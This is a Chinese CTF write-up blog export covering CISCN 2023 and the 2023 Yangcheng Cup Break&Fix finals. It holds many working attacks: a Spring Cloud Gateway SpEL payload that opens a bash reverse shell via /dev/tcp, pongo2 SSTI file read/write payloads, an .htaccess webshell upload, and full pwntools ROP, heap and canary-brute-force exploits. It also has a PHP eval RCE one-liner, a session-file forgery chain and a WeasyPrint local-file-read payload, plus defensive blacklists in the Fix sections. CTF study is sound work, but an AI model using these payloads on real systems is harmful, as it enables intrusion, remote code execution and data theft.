spring:  cloud:    nacos:      discovery:        server-addr: 127.0.0.1:8888      config:        name: backcfg        file-extension: json        group: DEFAULT_GROUP        server-addr: 127.0.0.1:8888

可以通过修改Gateway配置文件反代backendservice服务实现rce
参考文章：https://xz.aliyun.com/t/11493#toc

反弹shell
&#123;    &quot;spring&quot;:&#123;        &quot;cloud&quot;:&#123;            &quot;gateway&quot;:&#123;                &quot;routes&quot;:[                    &#123;                        &quot;id&quot;:&quot;exam&quot;,                        &quot;order&quot;:0,                        &quot;uri&quot;:&quot;lb://backendservice&quot;,                        &quot;predicates:&quot;:[                            &quot;Path=/evil/**&quot;                        ],                        &quot;filters&quot;:[                            &#123;                                &quot;name&quot;:&quot;RewritePath&quot;,                                &quot;args&quot;:&#123;                                    &quot;replacement&quot;:&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;                                &#125;                            &#125;                        ]                    &#125;                ]            &#125;        &#125;    &#125;&#125;



go_session源码
package routeimport (	&quot;github.com/flosch/pongo2/v6&quot;	&quot;github.com/gin-gonic/gin&quot;	&quot;github.com/gorilla/sessions&quot;	&quot;html&quot;	&quot;io&quot;	&quot;net/http&quot;	&quot;os&quot;)var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))func Index(c *gin.Context) &#123;	session, err := store.Get(c.Request, &quot;session-name&quot;)	if err != nil &#123;		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)		return	&#125;	if session.Values[&quot;name&quot;] == nil &#123;		session.Values[&quot;name&quot;] = &quot;guest&quot;		err = session.Save(c.Request, c.Writer)		if err != nil &#123;			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)			return		&#125;	&#125;	c.String(200, &quot;Hello, guest&quot;)&#125;func Admin(c *gin.Context) &#123;	session, err := store.Get(c.Request, &quot;session-name&quot;)	if err != nil &#123;		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)		return	&#125;	if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123;		http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError)		return	&#125;	name := c.DefaultQuery(&quot;name&quot;, &quot;ssti&quot;)	xssWaf := html.EscapeString(name)	tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;)	if err != nil &#123;		panic(err)	&#125;	out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;)	if err != nil &#123;		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)		return	&#125;	c.String(200, out)&#125;func Flask(c *gin.Context) &#123;	session, err := store.Get(c.Request, &quot;session-name&quot;)	if err != nil &#123;		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)		return	&#125;	if session.Values[&quot;name&quot;] == nil &#123;		if err != nil &#123;			http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError)			return		&#125;	&#125;	resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;))	if err != nil &#123;		return	&#125;	defer resp.Body.Close()	body, _ := io.ReadAll(resp.Body)	c.String(200, string(body))&#125;

有三个路由
r.GET(&quot;/&quot;, route.Index)r.GET(&quot;/admin&quot;, route.Admin)r.GET(&quot;/flask&quot;, route.Flask)

Index路由提供了一个默认的session，name赋值为guestAdmin路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞Flask路由访问内部5000端口的flask服务并回显页面
因为SESSION_KEY是从环境变量获取的，猜测为空，进行session伪造本地修改session.Values[&quot;name&quot;] = &quot;admin&quot;，运行拿到伪造的session

访问/flask?name=/通过报错拿到flask源码

from flask import Flask,requestapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    name = request.args[&#x27;name&#x27;]    return name + &#x27;no ssti&#x27;if __name__== &quot;__main__&quot;:    app.run(host=&quot;127.0.0.1&quot;,port=5000,debug=True)


可以看到flask开启了debug模式，debug攻击点一般在算pin或debug热加载但是访问/console实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通
如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载

所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容
查阅官方手册可知pongo2与Django 1.7有兼容的语法和功能集
Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取
写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参


//读文件&#123;%include c.Request.Referer()%&#125;&#123;%include c.Request.Host()%&#125;//写文件//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py



覆盖后就可以执行我们自定义的内容了

pwn烧烤摊儿修改名称存在栈溢出，程序不存在system函数，使用orw获取flag
from pwn import *#p=process(&#x27;./shaokao&#x27;)p=remote(&quot;123.56.251.120&quot;,&quot;12585&quot;)e=ELF(&quot;./shaokao&quot;)fopen=e.sym[&#x27;open64&#x27;]read=e.sym[&#x27;read&#x27;]write=e.sym[&#x27;write&#x27;]#gdb.attach(p,&#x27;bp 0x401fae&#x27;)rdi=0x000000000040264f #rdirsi=0x000000000040a67e #rsirdx=0x00000000004a404b #rdx rbxp.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)p.sendline(&quot;3&quot;)p.sendline(&#x27;-100000&#x27;)p.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)p.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)payload=b&#x27;flag&#x27;.ljust(0x28,b&#x27;\x00&#x27;)payload+=p64(rdi)+p64(0x4e60f0)+p64(rsi)+p64(0)+p64(fopen)payload+=p64(rdi)+p64(3)+p64(rsi)+p64(0x4e60f0)+p64(rdx)+p64(0x40)+b&#x27;a&#x27;*8+p64(read)payload+=p64(rdi)+p64(1)+p64(write)p.sendline(payload)

StrangeTalkBot程序使用了protobuf协议解析输入数据，构造protobuf数据，传入即可程序中存在uaf漏洞与数组越界漏洞，利用gadget构造栈迁移，实现orw
from pwn import *import varintimport sysdef Mode(m):    return b&#x27;\x08&#x27;+varint.encode(m&lt;&lt;1)def Ind(i):    return b&#x27;\x10&#x27;+varint.encode(i&lt;&lt;1)def Size(s):    return b&#x27;\x18&#x27;+varint.encode(s&lt;&lt;1)def Data(d):    return b&#x27;\x22&#x27;+varint.encode(len(d))+ddef add(ind,size,data=b&#x27; &#x27;):    payload=Mode(1)+Ind(ind)+Size(size)+Data(data)    p.sendafter(&quot;now: \n&quot;,payload)def edit(ind,data):    payload=Mode(2)+Ind(ind)+Size(0)+Data(data)    p.sendafter(&quot;now: \n&quot;,payload)def show(ind):    payload=Mode(3)+Ind(ind)+Size(0)+Data(b&#x27;&#x27;)    p.sendafter(&quot;now: \n&quot;,payload)def free(ind):    payload=Mode(4)+Ind(ind)+Size(0)+Data(b&#x27;&#x27;)    p.sendafter(&quot;now: \n&quot;,payload)e=ELF(&quot;./pwn&quot;)context.binary=elibc=ELF(&quot;./libc-2.31.so&quot;)if len(sys.argv)==1:    p=process(&quot;./pwn&quot;)    gdb.attach(p)else:    p=remote(&quot;123.56.244.196&quot;,&quot;35492&quot;)for i in range(10):    add(i,0xe8)for i in range(7):    free(i)show(1)heap=u64(p.read(8))print(hex(heap))show(2)heap1=u64(p.read(8))print(hex(heap1))free(7)free(8)show(8)d=u64(p.read(8))print(hex(d))libc.address=d-0x1eccc0free_hook=libc.sym[&#x27;__free_hook&#x27;]gadget=libc.address+0x154deamprotect=libc.sym[&#x27;mprotect&#x27;]rdi=0x0000000000023b6a+libc.addressrsi=0x000000000002601f+libc.addressrdx=0x0000000000142c92+libc.addressleave=libc.address+0x00000000000578c8edit(6,p64(free_hook))add(0x20,0xe8)payload=b&#x27;a&#x27;edit(0,flat([heap+0x48,leave,    heap1&amp;0xfffffffffffff000,    heap,0,    leave,0,0,0,    heap,    rdi,heap1&amp;0xfffffffffffff000,    rsi,0x1000,    rdx,7,    mprotect,    heap1]))shellcode=shellcraft.open(&#x27;flag&#x27;)+shellcraft.read(3,heap-0x50,0x50)+shellcraft.write(1,heap-0x50,0x50)edit(1,asm(shellcode))add(0x11,0xe8)add(0x12,0xe8,p64(gadget))print(hex(free_hook))print(hex(gadget))free(0)p.interactive()


funcanary程序使用了fork，所以在子进程中报错，不会使程序中断，所以爆破canary，然后跳转到后门位置就可以了
from pwn import *backdoor=0x1229#p=process(&quot;./funcanary&quot;)p=remote(&quot;123.56.135.185&quot;,&quot;32640&quot;)canary=b&#x27;\x00&#x27;for i in range(7):    for j in range(0x100):        p.sendafter(b&#x27;welcome\n&#x27;,b&#x27;a&#x27;*0x68+canary+p8(j))        data=p.readline()        if b&#x27;stack&#x27; not in data:            print(j)            canary+=p8(j)            breaki=0context.log_level=&#x27;debug&#x27;f=open(&#x27;data&#x27;,&#x27;wb&#x27;)while i&lt;0x10:    for j in range(0x30):        data=p.readuntil(&#x27;welcome\n&#x27;)        f.write(data)        p.send(b&#x27;a&#x27;*0x68+canary+b&#x27;b&#x27;*8+p16(0xffff&amp;(0x1200+j+i*0x1000)))        pause()    i+=1p.interactive()


Shell We Go当认证结束之后，执行echo指令，存在栈溢出，使用+可以跳过栈空间，直接覆盖返回值构造rop，执行orw
from pwn import *p=remote(&quot;47.93.187.243&quot;,&quot;38686&quot;)p.sendline(b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;)context.log_level=&#x27;debug&#x27;cmd=&quot;&quot;&quot;bp 0x4c181abp 0x4c18a0&quot;&quot;&quot;def makepayload(data):    e=b&#x27;&#x27;    i=0    step=0x20    while i&lt;len(data):        e+=data[i:i+step]+b&#x27; &#x27;        i+=step    pass    return b&#x27;echo &#x27;+erdi=0x0000000000444fecsystem=0x43e7e6rsi=0x000000000041e818rdx=0x000000000049e11dsh=0x4c38e7rax=0x000000000040d9e6flag=0x4c34c8syscall=0x000000000040328ce=ELF(&quot;./pwn&quot;)bss=e.bss()payload=b&#x27;+&#x27;*(0x298-0x78)+b&#x27;\x00&#x27;*3+p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)payload+=p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x40)+p64(rax)+p64(0)+p64(syscall)payload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x200)+p64(rdx)+p64(0x40)+p64(rax)+p64(1)+p64(syscall)p.sendline(makepayload(payload))p.interactive()



reversebabyREhttps://snap.berkeley.edu/ 导入xml
导出密文后异或得到flag

a=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]for i in range(1,len(a)):    a[i]=a[i]^a[i-1]print(bytes(a))]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023竞赛</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023羊城杯决赛web&amp;pwn Break&amp;Fix wp</title>
    <url>/posts/cec9c888/</url>
    <content><![CDATA[Break和Fix阶段都是小组第一
比赛的时候没写wp，赛后复现
web-ezSSTIBreak焚靖一把梭python -m fenjing crack --url &quot;http://192.168.100.100:10007/&quot; --method GET --inputs name  --environment jinja

Fixapp.py
from flask import Flask,requestfrom jinja2 import Templateimport reapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    name = request.args.get(&#x27;name&#x27;,&#x27;CTFer&lt;!--?name=CTFer&#x27;)    if not re.findall(r&quot;&#x27;|_|\\x|\\u|&#123;&#123;|\+|attr|\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen&quot;,name):        t = Template(&quot;hello &quot;+name)        return t.render()    else:        t = Template(&quot;Hacker!!!&quot;)        return t.render()if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;,port=5000)

直接在正则中添加&quot;，()，[]，\等符号，注意不要过滤太严格，否则过不了check
web-easyuploadBreakF12可以看到账号密码，admin/hgrehhterh，跳转到dadaadwdwfegrgewg.php，一个文件上传点
上传.htaccess后传图片拿shell
AddType application/x-httpd-php .png


Fixdadaadwdwfegrgewg.php
&lt;?phpheader(&quot;Content-type: text/html;charset=utf-8&quot;);error_reporting(1);define(&quot;WWW_ROOT&quot;,$_SERVER[&#x27;DOCUMENT_ROOT&#x27;]);define(&quot;APP_ROOT&quot;,str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,dirname(__FILE__)));define(&quot;APP_URL_ROOT&quot;,str_replace(WWW_ROOT,&quot;&quot;,APP_ROOT));define(&quot;UPLOAD_PATH&quot;, &quot;upload&quot;);?&gt;&lt;?php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;?&gt;&lt;div id=&quot;upload_panel&quot;&gt;            &lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;                &lt;p&gt;请选择要上传的图片：&lt;p&gt;                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;            &lt;/form&gt;            &lt;div id=&quot;msg&quot;&gt;                &lt;?php                     if($msg != null)&#123;                        echo &quot;提示：&quot;.$msg;                    &#125;                ?&gt;            &lt;/div&gt;            &lt;div id=&quot;img&quot;&gt;                &lt;?php                    if($is_upload)&#123;                        echo &#x27;&lt;img src=&quot;&#x27;.$img_path.&#x27;&quot; width=&quot;250px&quot; /&gt;&#x27;;                    &#125;                ?&gt;            &lt;/div&gt;&lt;/div&gt;

黑名单中加个.htaccess可以直接过check
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.htaccess&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);

web-BabyMemoBreak扫目录下载www.zip
index.php部分源码
&lt;?phpob_start();if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;    if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;])) &#123;        $_SESSION[&#x27;username&#x27;] = $_POST[&#x27;username&#x27;];        if (!isset($_SESSION[&#x27;memos&#x27;])) &#123;            $_SESSION[&#x27;memos&#x27;] = [];        &#125;        echo &#x27;&lt;script&gt;window.location.href=&quot;memo.php&quot;;&lt;/script&gt;&#x27;;        exit;    &#125; else &#123;        echo &#x27;&lt;script&gt;window.location.href=&quot;index.php?error=1&quot;;&lt;/script&gt;&#x27;;        exit;    &#125;&#125;ob_end_flush();?&gt;

memo.php
&lt;?phpsession_start();if (!isset($_SESSION[&#x27;username&#x27;])) &#123;    header(&#x27;Location: index.php&#x27;);    exit();&#125;if (isset($_POST[&#x27;memo&#x27;]) &amp;&amp; !empty($_POST[&#x27;memo&#x27;])) &#123;    $_SESSION[&#x27;memos&#x27;][] = $_POST[&#x27;memo&#x27;];&#125;if (isset($_POST[&#x27;backup&#x27;])) &#123;    $backupMemos = implode(PHP_EOL, $_SESSION[&#x27;memos&#x27;]);    $random = bin2hex(random_bytes(8));    $filename = &#x27;/tmp/&#x27; . $_SESSION[&#x27;username&#x27;] . &#x27;_&#x27; . $random;    // Handle compression method and file extension    $compressionMethod = $_POST[&#x27;compression&#x27;] ?? &#x27;none&#x27;;    switch ($compressionMethod) &#123;        case &#x27;gzip&#x27;:            $compressedData = gzencode($backupMemos);            $filename .= &#x27;.gz&#x27;;            $mimeType = &#x27;application/gzip&#x27;;            break;        case &#x27;bzip2&#x27;:            $compressedData = bzcompress($backupMemos);            $filename .= &#x27;.bz2&#x27;;            $mimeType = &#x27;application/x-bzip2&#x27;;            break;        case &#x27;zip&#x27;:            $zip = new ZipArchive();            $zipFilename = $filename . &#x27;.zip&#x27;;            if ($zip-&gt;open($zipFilename, ZipArchive::CREATE) === true) &#123;                $zip-&gt;addFromString($filename, $backupMemos);                $zip-&gt;close();            &#125;            $filename = $zipFilename;            $mimeType = &#x27;application/zip&#x27;;            break;        case &#x27;none&#x27;:            $compressedData = $backupMemos;            $filename .= &#x27;.txt&#x27;;            $mimeType = &#x27;text/plain&#x27;;            break;        default:            // I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t play any tricks, okay~            $compressedData = str_rot13($backupMemos);            $filename .= &#x27;.&#x27; . $compressionMethod;            $mimeType = &#x27;text/plain&#x27;;            while (strpos($filename, &#x27;../&#x27;) !== false) &#123;                $filename = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $filename);            &#125;            break;    &#125;    file_put_contents($filename, $compressedData);    // Send headers and output file content    header(&#x27;Content-Description: File Transfer&#x27;);    header(&#x27;Content-Type: &#x27; . $mimeType);    header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . basename($filename) . &#x27;&quot;&#x27;);    header(&#x27;Content-Length: &#x27; . filesize($filename));    readfile($filename);&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Memo&lt;/title&gt;    &lt;style&gt;        body &#123;            background-color: beige;            font-family: Arial, sans-serif;        &#125;        h1,        h2 &#123;            color: darkslategray;            margin-top: 30px;            margin-bottom: 10px;        &#125;        form &#123;            margin: 30px auto;            width: 80%;            padding: 20px;            background-color: white;            border-radius: 10px;            box-shadow: 0px 0px 10px 2px rgba(0, 0, 0, 0.3);        &#125;        label &#123;            display: block;            margin-bottom: 10px;        &#125;        input[type=&quot;text&quot;],        select &#123;            width: 100%;            padding: 10px;            border-radius: 5px;            border: none;            margin-bottom: 20px;        &#125;        button[type=&quot;submit&quot;] &#123;            background-color: darkslategray;            color: white;            border: none;            padding: 10px 20px;            border-radius: 5px;            cursor: pointer;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;Welcome, &lt;?php echo htmlspecialchars($_SESSION[&#x27;username&#x27;]); ?&gt;&lt;/h1&gt;    &lt;form action=&quot;memo.php&quot; method=&quot;post&quot;&gt;        &lt;label for=&quot;memo&quot;&gt;New Memo:&lt;/label&gt;        &lt;input type=&quot;text&quot; name=&quot;memo&quot; id=&quot;memo&quot; required&gt;        &lt;button type=&quot;submit&quot;&gt;Add Memo&lt;/button&gt;    &lt;/form&gt;    &lt;h2&gt;Here 1s Your Memos:&lt;/h2&gt;    &lt;ul&gt;        &lt;?php foreach ($_SESSION[&#x27;memos&#x27;] as $memo) : ?&gt;            &lt;li&gt;&lt;?php echo htmlspecialchars($memo); ?&gt;&lt;/li&gt;        &lt;?php endforeach; ?&gt;        &lt;?php if (isset($_SESSION[&#x27;admin&#x27;]) &amp;&amp; $_SESSION[&#x27;admin&#x27;] === true) : ?&gt;            &lt;li&gt;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;        &lt;?php endif ?&gt;    &lt;/ul&gt;    &lt;form action=&quot;memo.php&quot; method=&quot;post&quot;&gt;        &lt;label for=&quot;compression&quot;&gt;Compression method:&lt;/label&gt;        &lt;select name=&quot;compression&quot; id=&quot;compression&quot;&gt;            &lt;option value=&quot;none&quot;&gt;None&lt;/option&gt;            &lt;option value=&quot;gzip&quot;&gt;GZIP&lt;/option&gt;            &lt;option value=&quot;bzip2&quot;&gt;BZIP2&lt;/option&gt;            &lt;option value=&quot;zip&quot;&gt;ZIP&lt;/option&gt;        &lt;/select&gt;        &lt;button type=&quot;submit&quot; name=&quot;backup&quot; value=&quot;1&quot;&gt;Export Backup&lt;/button&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;


1：首先很明显，当$_SESSION[&#39;admin&#39;] === true时就给flag，所以我们需要伪造session
&lt;?php if (isset($_SESSION[&#x27;admin&#x27;]) &amp;&amp; $_SESSION[&#x27;admin&#x27;] === true) : ?&gt;            &lt;li&gt;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;&lt;?php endif ?&gt;

2：网页有个下载功能点，可以自定义后缀
但是过滤了../
default:    // I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t plaany tricks, okay~    $compressedData = str_rot13($backupMemos);    $filename .= &#x27;.&#x27; . $compressionMethod;    $mimeType = &#x27;text/plain&#x27;;    while (strpos($filename, &#x27;../&#x27;) !== false) &#123;        $filename = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $filename);    &#125;    break;

3：接着file_put_contents写到/tmp目录下，格式为用户名_随机数.文件后缀，其中用户名和文件后缀是可控的
$random = bin2hex(random_bytes(8));$filename = &#x27;/tmp/&#x27; . $_SESSION[&#x27;username&#x27;] . &#x27;_&#x27; . $random;$compressionMethod = $_POST[&#x27;compression&#x27;] ?? &#x27;none&#x27;;$filename .= &#x27;.&#x27; . $compressionMethod;file_put_contents($filename, $compressedData);// Send headers and output file contentheader(&#x27;Content-Description: File Transfer&#x27;);header(&#x27;Content-Type: &#x27; . $mimeType);header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . basename($filename) . &#x27;&quot;&#x27;);header(&#x27;Content-Length: &#x27; . filesize($filename));readfile($filename);


根据第二点和第三点可以得知，当传compression值为./时，与前面的.组合变成../，然后被替换成空，就可以修改文件格式为用户名_随机数

而在php中，session文件默认位置是/tmp/sess_PHPSESSID，那么我们就可以把伪造的内容写入文件，然后设置PHPSESSID去访问
本题用的解析引擎是默认的php，格式为键名 + 竖线 + 经过serialize()函数序列化处理的值，例如username|s:1:&quot;q&quot;;memos|a:1:&#123;i:0;s:1:&quot;a&quot;;&#125;
我们可以伪造一个admin|b:1;username|s:5:&quot;admin&quot;;，注意代码中还有一层str_rot13，变成nqzva|o:1;hfreanzr|f:5:&quot;nqzva&quot;;
然后用sess登录后写入进memos

设置后缀为./，写入到sess_46364caa4533f999

设置PHPSESSID为46364caa4533f999访问拿到flag

Fix我的修法应该是非预期了
直接修改读flag的命令就过了
&lt;?php if (isset($_SESSION[&#x27;admin&#x27;]) &amp;&amp; $_SESSION[&#x27;admin&#x27;] === true) : ?&gt;            &lt;li&gt;&lt;?php system(&quot;cat flag&quot;); ?&gt;&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;&lt;?php endif ?&gt;

正常可以设置一个判断，使用户不能等于sess或者在后缀处加个白名单等等
web-fuzee_rceBreak弱口令admin/admin123直接登录后跳转到goods.php，然后就是一片空白，当时比赛时尝试了几个常见的参数，都没试出来就放弃了，在Fix阶段看到源码后没想到参数是w1key
传参后拿到源码
&lt;?phperror_reporting(0);include (&quot;check.php&quot;);if (isset($_GET[&#x27;w1key&#x27;])) &#123;    highlight_file(__FILE__);    $w1key = $_GET[&#x27;w1key&#x27;];    if (is_numeric($w1key) &amp;&amp; intval($w1key) == $w1key &amp;&amp; strlen($w1key) &lt;= 3 &amp;&amp; $w1key &gt; 999999999) &#123;        echo &quot;good&quot;;    &#125;    else &#123;        die(&quot;Please input a valid number!&quot;);    &#125;&#125;if (isset($_POST[&#x27;w1key&#x27;])) &#123;    $w1key = $_POST[&#x27;w1key&#x27;];    strCheck($w1key);    eval($w1key);&#125;?&gt;Please input a valid number!

第一个if没啥用，要过的话用科学计数法就行
第二个if存在一个代码执行，但是有个waf，会过滤一些字符，同时存在长度限制
先fuzz看下能用的符号

可以用自增rce
w1key=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=ls

Fix比赛时修的代码：
&lt;?phpfunction strCheck($w1key)&#123;    if (is_string($w1key) &amp;&amp; strlen($w1key) &lt;= 83) &#123;        if (!preg_match(&quot;/[1-9a-zA-Z!,()\[\]\/%+@&#x27;#^&amp;%*:\.&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$w1key))&#123;            return $w1key;        &#125;else&#123;            die(&quot;黑客是吧，我看你怎么黑！&quot;);        &#125;    &#125;    else&#123;        die(&quot;太长了&quot;);      &#125;    &#125;



web-Oh! My PDFBreak
忘记当时有没有给源码了，就先当没有源码来分析吧

有个注册和登录功能，主页面的功能是访问提供的url并转成pdf然后下载
随意注册一个账号登录后提示需要是admin权限才能操作

抓包发现使用了jwt，尝试空密钥直接修改isadmin的值后成功绕过

然后是主功能点，试了下不能使用类似file://的协议，只能使用http://在vps上开个监听，访问后可以看到WeasyPrint库的特征

这个爬虫虽然不会渲染js，但是却可以解析&lt;link attachment=xxx&gt;，因此我们可以在vps上构造payload： &lt;link rel=&quot;attachment&quot; href=&quot;file:///etc/passwd&quot;&gt;来实现任意文件读取
例如
&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;link rel=&quot;attachment&quot; href=&quot;file:///flag&quot;&gt;&lt;/body&gt;&lt;/html&gt;

然后去访问这个页面，返回一个pdf，用binwalk提取就能看到文件内容了

